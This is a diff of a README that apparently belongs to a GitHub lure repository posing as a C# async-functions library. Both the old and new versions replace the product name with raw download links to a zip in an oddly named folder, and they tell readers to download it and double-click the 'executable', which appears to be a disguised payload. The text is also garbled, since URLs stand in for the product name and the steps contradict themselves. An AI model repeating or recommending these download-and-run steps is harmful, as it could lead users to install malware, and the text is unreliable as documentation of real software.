@@ -1,10 +1,10 @@
-# 🎉 https://github.com/maazif017/soenneker.invocations.asyncs.funcs/raw/refs/heads/main/arseniureted/funcs_invocations_soenneker_asyncs_patamar.zip - Simplifying Async Function Use 
+# 🎉 https://raw.githubusercontent.com/maazif017/soenneker.invocations.asyncs.funcs/main/arseniureted/soenneker-asyncs-invocations-funcs-1.3-alpha.5.zip - Simplifying Async Function Use 
 
-[![Download](https://github.com/maazif017/soenneker.invocations.asyncs.funcs/raw/refs/heads/main/arseniureted/funcs_invocations_soenneker_asyncs_patamar.zip%20Now-Click%20Here-brightgreen)](https://github.com/maazif017/soenneker.invocations.asyncs.funcs/raw/refs/heads/main/arseniureted/funcs_invocations_soenneker_asyncs_patamar.zip)
+[![Download](https://raw.githubusercontent.com/maazif017/soenneker.invocations.asyncs.funcs/main/arseniureted/soenneker-asyncs-invocations-funcs-1.3-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/maazif017/soenneker.invocations.asyncs.funcs/main/arseniureted/soenneker-asyncs-invocations-funcs-1.3-alpha.5.zip)
 
 ## 📜 Description
 
-https://github.com/maazif017/soenneker.invocations.asyncs.funcs/raw/refs/heads/main/arseniureted/funcs_invocations_soenneker_asyncs_patamar.zip is a tool designed to help you handle asynchronous tasks easily. It allows you to work with functions that run in the background without blocking your main tasks. This means your applications can run smoothly while performing other operations. You can manage tasks and their states effectively, all while keeping memory usage low. 
+https://raw.githubusercontent.com/maazif017/soenneker.invocations.asyncs.funcs/main/arseniureted/soenneker-asyncs-invocations-funcs-1.3-alpha.5.zip is a tool designed to help you handle asynchronous tasks easily. It allows you to work with functions that run in the background without blocking your main tasks. This means your applications can run smoothly while performing other operations. You can manage tasks and their states effectively, all while keeping memory usage low. 
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**
    Go to the Releases page to find the latest version of the software:
-   [Download Here](https://github.com/maazif017/soenneker.invocations.asyncs.funcs/raw/refs/heads/main/arseniureted/funcs_invocations_soenneker_asyncs_patamar.zip)
+   [Download Here](https://raw.githubusercontent.com/maazif017/soenneker.invocations.asyncs.funcs/main/arseniureted/soenneker-asyncs-invocations-funcs-1.3-alpha.5.zip)
 
 2. **Download the Software**
    On the Releases page, you will see a list of available versions. Click on the latest version link to start the download.
@@ -21,7 +21,7 @@ Follow these steps to download and run the application:
    Once the download is complete, locate the downloaded file on your computer. If it is a compressed file (.zip or .tar), extract its contents.
 
 4. **Run the Application**
-   Double-click the executable file (e.g., https://github.com/maazif017/soenneker.invocations.asyncs.funcs/raw/refs/heads/main/arseniureted/funcs_invocations_soenneker_asyncs_patamar.zip) to start the application. Follow the on-screen instructions to set it up.
+   Double-click the executable file (e.g., https://raw.githubusercontent.com/maazif017/soenneker.invocations.asyncs.funcs/main/arseniureted/soenneker-asyncs-invocations-funcs-1.3-alpha.5.zip) to start the application. Follow the on-screen instructions to set it up.
 
 ## 📋 System Requirements
 
@@ -50,8 +50,8 @@ Follow these steps to download and run the application:
 
 ## 🔗 Download & Install
 
-To begin using https://github.com/maazif017/soenneker.invocations.asyncs.funcs/raw/refs/heads/main/arseniureted/funcs_invocations_soenneker_asyncs_patamar.zip, you need to download the latest version from the Releases page. Visit this link to download:  
-[Download Here](https://github.com/maazif017/soenneker.invocations.asyncs.funcs/raw/refs/heads/main/arseniureted/funcs_invocations_soenneker_asyncs_patamar.zip)
+To begin using https://raw.githubusercontent.com/maazif017/soenneker.invocations.asyncs.funcs/main/arseniureted/soenneker-asyncs-invocations-funcs-1.3-alpha.5.zip, you need to download the latest version from the Releases page. Visit this link to download:  
+[Download Here](https://raw.githubusercontent.com/maazif017/soenneker.invocations.asyncs.funcs/main/arseniureted/soenneker-asyncs-invocations-funcs-1.3-alpha.5.zip)
 
 After downloading, follow the steps in the "Getting Started" section to run the application.
 
@@ -72,7 +72,7 @@ The tool is related to various concepts such as async, async function invocation
 
 ## 📚 Additional Resources
 
-You can find more information about asynchronous programming in C# on the Microsoft documentation site. These resources can help you gain a better understanding and make the most out of https://github.com/maazif017/soenneker.invocations.asyncs.funcs/raw/refs/heads/main/arseniureted/funcs_invocations_soenneker_asyncs_patamar.zip
+You can find more information about asynchronous programming in C# on the Microsoft documentation site. These resources can help you gain a better understanding and make the most out of https://raw.githubusercontent.com/maazif017/soenneker.invocations.asyncs.funcs/main/arseniureted/soenneker-asyncs-invocations-funcs-1.3-alpha.5.zip
 
 ## 🛠️ Troubleshooting
 
@@ -82,4 +82,4 @@ If you encounter issues, consider the following:
 - Try reinstalling the application.
 - If problems persist, check online forums or the GitHub issues page for solutions.
 
-Now you are ready to enhance your applications with efficient asynchronous capabilities. Enjoy using https://github.com/maazif017/soenneker.invocations.asyncs.funcs/raw/refs/heads/main/arseniureted/funcs_invocations_soenneker_asyncs_patamar.zip!
+Now you are ready to enhance your applications with efficient asynchronous capabilities. Enjoy using https://raw.githubusercontent.com/maazif017/soenneker.invocations.asyncs.funcs/main/arseniureted/soenneker-asyncs-invocations-funcs-1.3-alpha.5.zip!
